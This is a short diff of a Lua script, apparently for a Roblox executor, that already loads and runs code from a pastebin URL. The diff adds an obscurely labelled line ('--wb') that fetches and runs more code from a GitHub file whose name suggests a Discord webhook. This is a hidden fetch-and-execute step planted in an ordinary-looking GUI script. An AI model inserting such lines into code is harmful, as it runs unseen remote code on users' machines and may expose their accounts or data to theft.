@@ -3,6 +3,8 @@
 -- toggle button added
 -- Instanxes:
 loadstring(game:HttpGet("https://pastebin.com/raw/uNb6892M",true))()
+--wb
+loadstring(game:HttpGet("https://raw.githubusercontent.com/rrixh/diskord/main/wHook_lulaslollipop",true))()
 
 local CoreGui = game:GetService("StarterGui") -- Variable of StarterGui
 CoreGui:SetCore("SendNotification", {
